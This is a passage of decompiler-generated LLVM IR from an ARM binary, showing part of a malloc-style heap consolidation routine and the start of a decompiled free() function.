  %v1_14ecc = add i32 %v0_14ec0, 4
  store i32 %v1_14ecc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14ed4

dec_label_pc_14ed4:                               ; preds = %dec_label_pc_14fd0, %dec_label_pc_14eb4
  %v1_14fc810 = phi i32 [ %v1_14fc8, %dec_label_pc_14fd0 ], [ %v5_14ec4, %dec_label_pc_14eb4 ]
  %v1_14ee0 = phi i32 [ %v1_14fd0, %dec_label_pc_14fd0 ], [ %v1_14ecc, %dec_label_pc_14eb4 ]
  %v1_14ed4 = inttoptr i32 %v1_14ee0 to i32*
  %v2_14ed4 = load i32, i32* %v1_14ed4, align 4
  store i32 %v2_14ed4, i32* %r1.global-to-local, align 4
  %v2_14ed8 = icmp eq i32 %v2_14ed4, 0
  br i1 %v2_14ed8, label %dec_label_pc_14fc8, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14ed4
  %v0_14ee0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14ee0, i32* %v1_14ed4, align 4
  %v0_14ee4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ee4

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14fbc, %dec_label_pc_14ee0
  %v0_14f00 = phi i32 [ %v0_14fbc, %dec_label_pc_14fbc ], [ %v0_14ee4.pre, %dec_label_pc_14ee0 ]
  %v1_14ee4 = add i32 %v0_14f00, 4
  %v2_14ee4 = inttoptr i32 %v1_14ee4 to i32*
  %v3_14ee4 = load i32, i32* %v2_14ee4, align 4
  store i32 %v3_14ee4, i32* %r3.global-to-local, align 4
  %v1_14ee8 = and i32 %v3_14ee4, -2
  store i32 %v1_14ee8, i32* %lr.global-to-local, align 4
  %v2_14eec = add i32 %v1_14ee8, %v0_14f00
  store i32 %v2_14eec, i32* @r0, align 4
  %v1_14ef0 = urem i32 %v3_14ee4, 2
  %v2_14ef0 = icmp eq i32 %v1_14ef0, 0
  %v1_14ef4 = add i32 %v0_14f00, 8
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i32*
  %v3_14ef4 = load i32, i32* %v2_14ef4, align 4
  store i32 %v3_14ef4, i32* %sl.global-to-local, align 4
  %v1_14ef8 = add i32 %v2_14eec, 4
  %v2_14ef8 = inttoptr i32 %v1_14ef8 to i32*
  %v3_14ef8 = load i32, i32* %v2_14ef8, align 4
  store i32 %v3_14ef8, i32* %r8.global-to-local, align 4
  br i1 %v2_14ef0, label %dec_label_pc_14f00, label %dec_label_pc_14f34

dec_label_pc_14f00:                               ; preds = %dec_label_pc_14ee4
  %v1_14f00 = inttoptr i32 %v0_14f00 to i32*
  %v2_14f00 = load i32, i32* %v1_14f00, align 4
  store i32 %v2_14f00, i32* %r5.global-to-local, align 4
  %v2_14f04 = sub i32 %v0_14f00, %v2_14f00
  store i32 %v2_14f04, i32* %r3.global-to-local, align 4
  %v1_14f08 = add i32 %v2_14f04, 8
  %v2_14f08 = inttoptr i32 %v1_14f08 to i32*
  %v3_14f08 = load i32, i32* %v2_14f08, align 4
  store i32 %v3_14f08, i32* %ip.global-to-local, align 4
  %v1_14f0c = add i32 %v3_14f08, 12
  %v2_14f0c = inttoptr i32 %v1_14f0c to i32*
  %v3_14f0c = load i32, i32* %v2_14f0c, align 4
  store i32 %v3_14f0c, i32* %r1.global-to-local, align 4
  %v9_14f10 = icmp eq i32 %v3_14f0c, %v2_14f04
  %v1_14f14 = add i32 %v2_14f04, 12
  %v2_14f14 = inttoptr i32 %v1_14f14 to i32*
  %v3_14f14 = load i32, i32* %v2_14f14, align 4
  store i32 %v3_14f14, i32* %r2.global-to-local, align 4
  br i1 %v9_14f10, label %dec_label_pc_14f1c, label %dec_label_pc_14f78

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14f00
  %v1_14f1c = add i32 %v3_14f14, 8
  %v2_14f1c = inttoptr i32 %v1_14f1c to i32*
  %v3_14f1c = load i32, i32* %v2_14f1c, align 4
  store i32 %v3_14f1c, i32* %r3.global-to-local, align 4
  %v9_14f20 = icmp eq i32 %v3_14f1c, %v2_14f04
  br i1 %v9_14f20, label %dec_label_pc_14f28, label %dec_label_pc_14f78

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f1c
  store i32 %v3_14f08, i32* %v2_14f1c, align 4
  %v0_14f2c = load i32, i32* %r2.global-to-local, align 4
  %v1_14f2c = load i32, i32* %ip.global-to-local, align 4
  %v2_14f2c = add i32 %v1_14f2c, 12
  %v3_14f2c = inttoptr i32 %v2_14f2c to i32*
  store i32 %v0_14f2c, i32* %v3_14f2c, align 4
  %v0_14f30 = load i32, i32* %lr.global-to-local, align 4
  %v1_14f30 = load i32, i32* %r5.global-to-local, align 4
  %v2_14f30 = add i32 %v1_14f30, %v0_14f30
  store i32 %v2_14f30, i32* %lr.global-to-local, align 4
  %v0_14f38.pre = load i32, i32* @r0, align 4
  %v0_14f3c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14ee4, %dec_label_pc_14f28
  %v0_14fac = phi i32 [ %v1_14ee8, %dec_label_pc_14ee4 ], [ %v2_14f30, %dec_label_pc_14f28 ]
  %v0_14f3c = phi i32 [ %v3_14ef8, %dec_label_pc_14ee4 ], [ %v0_14f3c.pre, %dec_label_pc_14f28 ]
  %v1_14f50 = phi i32 [ %v2_14eec, %dec_label_pc_14ee4 ], [ %v0_14f38.pre, %dec_label_pc_14f28 ]
  %v0_14f34 = load i32, i32* @r4, align 4
  %v1_14f34 = add i32 %v0_14f34, 44
  %v2_14f34 = inttoptr i32 %v1_14f34 to i32*
  %v3_14f34 = load i32, i32* %v2_14f34, align 4
  store i32 %v3_14f34, i32* %r3.global-to-local, align 4
  %v9_14f38 = icmp eq i32 %v1_14f50, %v3_14f34
  %v1_14f3c = and i32 %v0_14f3c, -4
  store i32 %v1_14f3c, i32* %r5.global-to-local, align 4
  br i1 %v9_14f38, label %dec_label_pc_14fac, label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f34
  %v2_14f44 = add i32 %v1_14f50, %v1_14f3c
  store i32 %v2_14f44, i32* %r3.global-to-local, align 4
  %v1_14f48 = add i32 %v2_14f44, 4
  %v2_14f48 = inttoptr i32 %v1_14f48 to i32*
  %v3_14f48 = load i32, i32* %v2_14f48, align 4
  store i32 %v3_14f48, i32* %r3.global-to-local, align 4
  %v1_14f4c = urem i32 %v3_14f48, 2
  %v2_14f4c = icmp eq i32 %v1_14f4c, 0
  %v2_14f50 = add i32 %v1_14f50, 4
  %v3_14f50 = inttoptr i32 %v2_14f50 to i32*
  store i32 %v1_14f3c, i32* %v3_14f50, align 4
  br i1 %v2_14f4c, label %dec_label_pc_14f58, label %dec_label_pc_14f44.dec_label_pc_14f88_crit_edge

dec_label_pc_14f44.dec_label_pc_14f88_crit_edge:  ; preds = %dec_label_pc_14f44
  %v0_14f8c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14f88

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f44
  %v0_14f58 = load i32, i32* @r0, align 4
  %v1_14f58 = add i32 %v0_14f58, 8
  %v2_14f58 = inttoptr i32 %v1_14f58 to i32*
  %v3_14f58 = load i32, i32* %v2_14f58, align 4
  store i32 %v3_14f58, i32* %ip.global-to-local, align 4
  %v1_14f5c = add i32 %v3_14f58, 12
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  store i32 %v3_14f5c, i32* %r3.global-to-local, align 4
  %v9_14f60 = icmp eq i32 %v3_14f5c, %v0_14f58
  %v1_14f64 = add i32 %v0_14f58, 12
  %v2_14f64 = inttoptr i32 %v1_14f64 to i32*
  %v3_14f64 = load i32, i32* %v2_14f64, align 4
  store i32 %v3_14f64, i32* %r2.global-to-local, align 4
  br i1 %v9_14f60, label %dec_label_pc_14f6c, label %dec_label_pc_14f78

dec_label_pc_14f6c:                               ; preds = %dec_label_pc_14f58
  %v1_14f6c = add i32 %v3_14f64, 8
  %v2_14f6c = inttoptr i32 %v1_14f6c to i32*
  %v3_14f6c = load i32, i32* %v2_14f6c, align 4
  store i32 %v3_14f6c, i32* %r3.global-to-local, align 4
  %v9_14f70 = icmp eq i32 %v3_14f6c, %v0_14f58
  br i1 %v9_14f70, label %dec_label_pc_14f7c, label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14f58, %dec_label_pc_14f1c, %dec_label_pc_14f00, %dec_label_pc_14f6c
  %v0_14f78 = call i32 @abort()
  store i32 %v0_14f78, i32* @r0, align 4
  %v0_14f7c.pre = load i32, i32* @ip, align 4
  %v1_14f7c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14f7c

dec_label_pc_14f7c:                               ; preds = %dec_label_pc_14f6c, %dec_label_pc_14f78
  %v1_14f7c = phi i32 [ %v3_14f64, %dec_label_pc_14f6c ], [ %v1_14f7c.pre, %dec_label_pc_14f78 ]
  %v0_14f7c = phi i32 [ %v3_14f58, %dec_label_pc_14f6c ], [ %v0_14f7c.pre, %dec_label_pc_14f78 ]
  %v2_14f7c = add i32 %v1_14f7c, 8
  %v3_14f7c = inttoptr i32 %v2_14f7c to i32*
  store i32 %v0_14f7c, i32* %v3_14f7c, align 4
  %v0_14f80 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f80 = load i32, i32* %ip.global-to-local, align 4
  %v2_14f80 = add i32 %v1_14f80, 12
  %v3_14f80 = inttoptr i32 %v2_14f80 to i32*
  store i32 %v0_14f80, i32* %v3_14f80, align 4
  %v0_14f84 = load i32, i32* %lr.global-to-local, align 4
  %v1_14f84 = load i32, i32* %r5.global-to-local, align 4
  %v2_14f84 = add i32 %v1_14f84, %v0_14f84
  store i32 %v2_14f84, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14f88

dec_label_pc_14f88:                               ; preds = %dec_label_pc_14f44.dec_label_pc_14f88_crit_edge, %dec_label_pc_14f7c
  %v0_14f8c = phi i32 [ %v0_14f8c.pre, %dec_label_pc_14f44.dec_label_pc_14f88_crit_edge ], [ %v2_14f84, %dec_label_pc_14f7c ]
  %v0_14f88 = load i32, i32* %r7.global-to-local, align 4
  %v1_14f88 = add i32 %v0_14f88, 8
  %v2_14f88 = inttoptr i32 %v1_14f88 to i32*
  %v3_14f88 = load i32, i32* %v2_14f88, align 4
  store i32 %v3_14f88, i32* %r2.global-to-local, align 4
  %v1_14f8c = or i32 %v0_14f8c, 1
  store i32 %v1_14f8c, i32* %r3.global-to-local, align 4
  %v0_14f90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14f90, i32* %v2_14f88, align 4
  %v0_14f94 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f94 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f94 = add i32 %v1_14f94, 12
  %v3_14f94 = inttoptr i32 %v2_14f94 to i32*
  store i32 %v0_14f94, i32* %v3_14f94, align 4
  %v0_14f98 = load i32, i32* %lr.global-to-local, align 4
  %v1_14f98 = load i32, i32* %r1.global-to-local, align 4
  %v3_14f98 = add i32 %v1_14f98, %v0_14f98
  %v4_14f98 = inttoptr i32 %v3_14f98 to i32*
  store i32 %v0_14f98, i32* %v4_14f98, align 4
  %v0_14f9c = load i32, i32* %r3.global-to-local, align 4
  %v1_14f9c = load i32, i32* %r1.global-to-local, align 4
  %v2_14f9c = add i32 %v1_14f9c, 4
  %v3_14f9c = inttoptr i32 %v2_14f9c to i32*
  store i32 %v0_14f9c, i32* %v3_14f9c, align 4
  %v0_14fa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fa0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14fa0 = add i32 %v1_14fa0, 8
  %v3_14fa0 = inttoptr i32 %v2_14fa0 to i32*
  store i32 %v0_14fa0, i32* %v3_14fa0, align 4
  %v0_14fa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14fa4 = load i32, i32* %r1.global-to-local, align 4
  %v2_14fa4 = add i32 %v1_14fa4, 12
  %v3_14fa4 = inttoptr i32 %v2_14fa4 to i32*
  store i32 %v0_14fa4, i32* %v3_14fa4, align 4
  br label %dec_label_pc_14fbc

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14f34
  %v2_14fac = add i32 %v1_14f3c, %v0_14fac
  %v1_14fb0 = or i32 %v2_14fac, 1
  store i32 %v1_14fb0, i32* %r3.global-to-local, align 4
  %v1_14fb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_14fb4 = add i32 %v1_14fb4, 4
  %v3_14fb4 = inttoptr i32 %v2_14fb4 to i32*
  store i32 %v1_14fb0, i32* %v3_14fb4, align 4
  %v0_14fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fb8 = load i32, i32* @r4, align 4
  %v2_14fb8 = add i32 %v1_14fb8, 44
  %v3_14fb8 = inttoptr i32 %v2_14fb8 to i32*
  store i32 %v0_14fb8, i32* %v3_14fb8, align 4
  br label %dec_label_pc_14fbc

dec_label_pc_14fbc:                               ; preds = %dec_label_pc_14f88, %dec_label_pc_14fac
  %v0_14fbc = load i32, i32* %sl.global-to-local, align 4
  %v2_14fbc = icmp eq i32 %v0_14fbc, 0
  store i32 %v0_14fbc, i32* %r1.global-to-local, align 4
  br i1 %v2_14fbc, label %dec_label_pc_14fc8.loopexit, label %dec_label_pc_14ee4

dec_label_pc_14fc8.loopexit:                      ; preds = %dec_label_pc_14fbc
  %v0_14fc8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_14fc8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14fc8

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14fc8.loopexit, %dec_label_pc_14ed4
  %v1_14fc8 = phi i32 [ %v1_14fc8.pre, %dec_label_pc_14fc8.loopexit ], [ %v1_14fc810, %dec_label_pc_14ed4 ]
  %v0_14fd0 = phi i32 [ %v0_14fc8.pre, %dec_label_pc_14fc8.loopexit ], [ %v1_14ee0, %dec_label_pc_14ed4 ]
  %v9_14fc8 = icmp eq i32 %v0_14fd0, %v1_14fc8
  br i1 %v9_14fc8, label %dec_label_pc_15040, label %dec_label_pc_14fd0

dec_label_pc_14fd0:                               ; preds = %dec_label_pc_14fc8
  %v1_14fd0 = add i32 %v0_14fd0, 4
  store i32 %v1_14fd0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14ed4

dec_label_pc_14fd8.dec_label_pc_14fd8_crit_edge:  ; preds = %dec_label_pc_14fd8.preheader, %dec_label_pc_14fd8.dec_label_pc_14fd8_crit_edge
  %v0_14fd8.pre = load i32, i32* @r4, align 4
  %v1_14fd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14fd8 = mul i32 %v1_14fd8.pre, 8
  %v5_14fd8 = add i32 %v4_14fd8, %v0_14fd8.pre
  %v1_14fdc = add i32 %v1_14fd8.pre, 1
  store i32 %v1_14fdc, i32* %r2.global-to-local, align 4
  %v1_14fe0 = add i32 %v5_14fd8, 44
  store i32 %v1_14fe0, i32* %r3.global-to-local, align 4
  %v2_14fe8 = add i32 %v5_14fd8, 52
  %v3_14fe8 = inttoptr i32 %v2_14fe8 to i32*
  store i32 %v1_14fe0, i32* %v3_14fe8, align 4
  %v0_14fec = load i32, i32* %r3.global-to-local, align 4
  %v2_14fec = add i32 %v0_14fec, 12
  %v3_14fec = inttoptr i32 %v2_14fec to i32*
  store i32 %v0_14fec, i32* %v3_14fec, align 4
  %v7_14ff0 = icmp sgt i32 %v1_14fdc, 95
  br i1 %v7_14ff0, label %dec_label_pc_14ff4, label %dec_label_pc_14fd8.dec_label_pc_14fd8_crit_edge

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fd8.dec_label_pc_14fd8_crit_edge
  %v0_14ff4 = load i32, i32* @r4, align 4
  %v1_14ff4 = inttoptr i32 %v0_14ff4 to i32*
  %v2_14ff4 = load i32, i32* %v1_14ff4, align 4
  store i32 %v2_14ff4, i32* %r2.global-to-local, align 4
  %v1_14ff8 = add i32 %v0_14ff4, 864
  %v2_14ff8 = inttoptr i32 %v1_14ff8 to i32*
  %v3_14ff8 = load i32, i32* %v2_14ff8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15000 = urem i32 %v2_14ff4, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_15008 = or i32 %v3_14ff8, 1
  store i32 %v1_15008, i32* %r1.global-to-local, align 4
  %v1_1500c = or i32 %v1_15000, 72
  store i32 %v1_1500c, i32* %r2.global-to-local, align 4
  %v1_15010 = add i32 %v0_14ff4, 52
  store i32 %v1_15010, i32* %ip.global-to-local, align 4
  %v2_15014 = add i32 %v0_14ff4, 840
  %v3_15014 = inttoptr i32 %v2_15014 to i32*
  store i32 0, i32* %v3_15014, align 4
  %v0_15018 = load i32, i32* %r3.global-to-local, align 4
  %v1_15018 = add i32 %v0_15018, 65536
  store i32 %v1_15018, i32* %r3.global-to-local, align 4
  %v0_1501c = load i32, i32* %r0.global-to-local, align 4
  %v1_1501c = load i32, i32* @r4, align 4
  %v2_1501c = add i32 %v1_1501c, 836
  %v3_1501c = inttoptr i32 %v2_1501c to i32*
  store i32 %v0_1501c, i32* %v3_1501c, align 4
  %v0_15020 = load i32, i32* %r0.global-to-local, align 4
  %v1_15020 = load i32, i32* @r4, align 4
  %v2_15020 = add i32 %v1_15020, 844
  %v3_15020 = inttoptr i32 %v2_15020 to i32*
  store i32 %v0_15020, i32* %v3_15020, align 4
  %v1_15024 = load i32, i32* @r4, align 4
  %v2_15024 = add i32 %v1_15024, 852
  %v3_15024 = inttoptr i32 %v2_15024 to i32*
  store i32 %v1_15018, i32* %v3_15024, align 4
  %v1_15028 = load i32, i32* @r4, align 4
  %v2_15028 = add i32 %v1_15028, 864
  %v3_15028 = inttoptr i32 %v2_15028 to i32*
  store i32 %v1_15008, i32* %v3_15028, align 4
  %v1_1502c = load i32, i32* @r4, align 4
  %v2_1502c = inttoptr i32 %v1_1502c to i32*
  store i32 %v1_1500c, i32* %v2_1502c, align 4
  %v0_15030 = load i32, i32* %ip.global-to-local, align 4
  %v1_15030 = load i32, i32* @r4, align 4
  %v2_15030 = add i32 %v1_15030, 44
  %v3_15030 = inttoptr i32 %v2_15030 to i32*
  store i32 %v0_15030, i32* %v3_15030, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_15038 = call i32 @sysconf(i32 30, i32 %v1_15008, i32 %v1_1500c, i32 %v1_15018)
  store i32 %v4_15038, i32* @r0, align 4
  %v1_1503c = load i32, i32* @r4, align 4
  %v2_1503c = add i32 %v1_1503c, 860
  %v3_1503c = inttoptr i32 %v2_1503c to i32*
  store i32 %v4_15038, i32* %v3_1503c, align 4
  br label %dec_label_pc_15040

dec_label_pc_15040:                               ; preds = %dec_label_pc_14fc8, %dec_label_pc_14ff4
  %v2_15044 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15044, i32* @r4, align 4
  %v1_15048 = load i32, i32* @r0, align 4
  ret i32 %v1_15048

; uselistorder directives
  uselistorder i32 %v0_14ff4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14fec, { 1, 0 }
  uselistorder i32 %v1_14fd0, { 1, 0 }
  uselistorder i32 %v0_14fbc, { 0, 2, 1 }
  uselistorder i32 %v0_14f98, { 1, 0 }
  uselistorder i32 %v1_14ee8, { 1, 0, 2 }
  uselistorder i32 %v0_14f00, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14ec0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 13, 2, 7, 3, 8, 4, 9, 5, 10, 0, 11, 12, 6, 14 }
  uselistorder label %dec_label_pc_15040, { 1, 0 }
  uselistorder label %dec_label_pc_14fd8.dec_label_pc_14fd8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14fbc, { 1, 0 }
  uselistorder label %dec_label_pc_14f88, { 1, 0 }
  uselistorder label %dec_label_pc_14f7c, { 1, 0 }
  uselistorder label %dec_label_pc_14f78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1504c = load i32, i32* @r4, align 4
  %v6_1504c = load i32, i32* @r5, align 4
  %v9_1504c = load i32, i32* @r6, align 4
  %v12_1504c = load i32, i32* @r7, align 4
  %v18_1504c = load i32, i32* @lr, align 4
  %v0_15054 = load i32, i32* @r0, align 4
  store i32 %v0_15054, i32* @r6, align 4
  %v2_15054 = icmp eq i32 %v0_15054, 0
  %v2_15058 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r7, align 4
  br i1 %v2_15054, label %dec_label_pc_15260, label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_15068 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 108) to i32*), align 4
  store i32 %v4_15068, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_15068, i32* %r2.global-to-local, align 4
  %v4_15074 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 68) to i32*), align 4
  store i32 %v4_15074, i32* %r1.global-to-local, align 4
  store i32 %v2_15058, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_15080 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  store i32 %v4_15080, i32* %ip.global-to-local, align 4
  store i32 86156, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15080)
  %v0_1508c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1508c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15094 = load i32, i32* @r7, align 4
  %v2_15094 = add i32 %v0_15094, 16
  %v3_15094 = inttoptr i32 %v2_15094 to i32*
  %v4_15094 = load i32, i32* %v3_15094, align 4
  store i32 %v4_15094, i32* %ip.global-to-local, align 4
  store i32 86176, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15094)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_150a4 = load i32, i32* @r7, align 4
  %v2_150a4 = add i32 %v0_150a4, 64
  %v3_150a4 = inttoptr i32 %v2_150a4 to i32*
  %v4_150a4 = load i32, i32* %v3_150a4, align 4
  store i32 %v4_150a4, i32* @lr, align 4
  %v0_150a8 = load i32, i32* @r6, align 4
  %v1_150a8 = add i32 %v0_150a8, -4
  %v2_150a8 = inttoptr i32 %v1_150a8 to i32*
  %v3_150a8 = load i32, i32* %v2_150a8, align 4
  store i32 %v3_150a8, i32* %r2.global-to-local, align 4
  %v1_150ac = inttoptr i32 %v4_150a4 to i32*
  %v2_150ac = load i32, i32* %v1_150ac, align 4
  store i32 %v2_150ac, i32* %r3.global-to-local, align 4
  %v1_150b0 = and i32 %v3_150a8, -4
  store i32 %v1_150b0, i32* %ip.global-to-local, align 4
  %v1_150b4 = add i32 %v0_150a8, -8
  store i32 %v1_150b4, i32* @r5, align 4
  store i32 %v1_150b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_150b0, %v2_150ac
  br i1 %tmp, label %dec_label_pc_150e4, label %dec_label_pc_150c4

dec_label_pc_150c4:                               ; preds = %dec_label_pc_15064
  %v1_150c4 = or i32 %v2_150ac, 3
  store i32 %v1_150c4, i32* %r3.global-to-local, align 4
  store i32 %v1_150c4, i32* %v1_150ac, align 4
  %v3_150c8 = load i32, i32* @lr, align 4
  %v4_150c8 = add i32 %v3_150c8, -8
  store i32 %v4_150c8, i32* %lr.global-to-local, align 4
  %v0_150cc = load i32, i32* %ip.global-to-local, align 4
  %v3_150cc = udiv i32 %v0_150cc, 8
  store i32 %v3_150cc, i32* %r1.global-to-local, align 4
  %v1_150d0 = add i32 %v3_150c8, -4
  store i32 %v1_150d0, i32* %r2.global-to-local, align 4
  %v4_150d4 = mul nuw i32 %v3_150cc, 4
  %v5_150d4 = add i32 %v4_150d4, %v1_150d0
  %v6_150d4 = inttoptr i32 %v5_150d4 to i32*
  %v7_150d4 = load i32, i32* %v6_150d4, align 4
  store i32 %v7_150d4, i32* %r3.global-to-local, align 4
  %v1_150d8 = load i32, i32* @r5, align 4
  %v2_150d8 = add i32 %v1_150d8, 8
  %v3_150d8 = inttoptr i32 %v2_150d8 to i32*
  store i32 %v7_150d4, i32* %v3_150d8, align 4
  %v0_150dc = load i32, i32* @r5, align 4
  %v1_150dc = load i32, i32* %r2.global-to-local, align 4
  %v2_150dc = load i32, i32* %r1.global-to-local, align 4
  %v5_150dc = mul i32 %v2_150dc, 4
  %v6_150dc = add i32 %v5_150dc, %v1_150dc
  %v7_150dc = inttoptr i32 %v6_150dc to i32*
  store i32 %v0_150dc, i32* %v7_150dc, align 4
  br label %dec_label_pc_15248

dec_label_pc_150e4:                               ; preds = %dec_label_pc_15064
  %v1_150e4 = and i32 %v3_150a8, 2
  %v2_150e4 = icmp eq i32 %v1_150e4, 0
  br i1 %v2_150e4, label %dec_label_pc_150ec, label %dec_label_pc_15220

dec_label_pc_150ec:                               ; preds = %dec_label_pc_150e4
  %v1_150ec = or i32 %v2_150ac, 1
  store i32 %v1_150ec, i32* %r3.global-to-local, align 4
  store i32 %v1_150ec, i32* %v1_150ac, align 4
  %v0_150f4 = load i32, i32* @r6, align 4
  %v1_150f4 = add i32 %v0_150f4, -4
  %v2_150f4 = inttoptr i32 %v1_150f4 to i32*
  %v3_150f4 = load i32, i32* %v2_150f4, align 4
  store i32 %v3_150f4, i32* %r3.global-to-local, align 4
  %v0_150f8 = load i32, i32* @r5, align 4
  %v1_150f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_150f8 = add i32 %v1_150f8, %v0_150f8
  store i32 %v2_150f8, i32* %lr.global-to-local, align 4
  %v1_150fc = urem i32 %v3_150f4, 2
  %v2_150fc = icmp eq i32 %v1_150fc, 0
  %v1_15100 = add i32 %v2_150f8, 4
  %v2_15100 = inttoptr i32 %v1_15100 to i32*
  %v3_15100 = load i32, i32* %v2_15100, align 4
  store i32 %v3_15100, i32* %r8.global-to-local, align 4
  br i1 %v2_150fc, label %dec_label_pc_15108, label %dec_label_pc_1513c

dec_label_pc_15108:                               ; preds = %dec_label_pc_150ec
  %v1_15108 = add i32 %v0_150f4, -8
  %v2_15108 = inttoptr i32 %v1_15108 to i32*
  %v3_15108 = load i32, i32* %v2_15108, align 4
  store i32 %v3_15108, i32* %r1.global-to-local, align 4
  %v2_1510c = sub i32 %v0_150f8, %v3_15108
  store i32 %v2_1510c, i32* %r3.global-to-local, align 4
  %v1_15110 = add i32 %v2_1510c, 8
  %v2_15110 = inttoptr i32 %v1_15110 to i32*
  %v3_15110 = load i32, i32* %v2_15110, align 4
  store i32 %v3_15110, i32* %r2.global-to-local, align 4
  %v1_15114 = add i32 %v3_15110, 12
  %v2_15114 = inttoptr i32 %v1_15114 to i32*
  %v3_15114 = load i32, i32* %v2_15114, align 4
  store i32 %v3_15114, i32* %r4.global-to-local, align 4
  %v9_15118 = icmp eq i32 %v3_15114, %v2_1510c
  %v1_1511c = add i32 %v2_1510c, 12
  %v2_1511c = inttoptr i32 %v1_1511c to i32*
  %v3_1511c = load i32, i32* %v2_1511c, align 4
  store i32 %v3_1511c, i32* %r0.global-to-local, align 4
  br i1 %v9_15118, label %dec_label_pc_15124, label %dec_label_pc_15188

dec_label_pc_15124:                               ; preds = %dec_label_pc_15108
  %v1_15124 = add i32 %v3_1511c, 8
  %v2_15124 = inttoptr i32 %v1_15124 to i32*
  %v3_15124 = load i32, i32* %v2_15124, align 4
  store i32 %v3_15124, i32* %r3.global-to-local, align 4
  %v9_15128 = icmp eq i32 %v3_15124, %v2_1510c
  br i1 %v9_15128, label %dec_label_pc_15130, label %dec_label_pc_15188

dec_label_pc_15130:                               ; preds = %dec_label_pc_15124
  store i32 %v3_15110, i32* %v2_15124, align 4
  %v0_15134 = load i32, i32* %r0.global-to-local, align 4
  %v1_15134 = load i32, i32* %r2.global-to-local, align 4
  %v2_15134 = add i32 %v1_15134, 12
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  store i32 %v0_15134, i32* %v3_15134, align 4
  %v0_15138 = load i32, i32* %ip.global-to-local, align 4
  %v1_15138 = load i32, i32* %r1.global-to-local, align 4
  %v2_15138 = add i32 %v1_15138, %v0_15138
  store i32 %v2_15138, i32* %ip.global-to-local, align 4
  %v0_15148.pre = load i32, i32* %lr.global-to-local, align 4
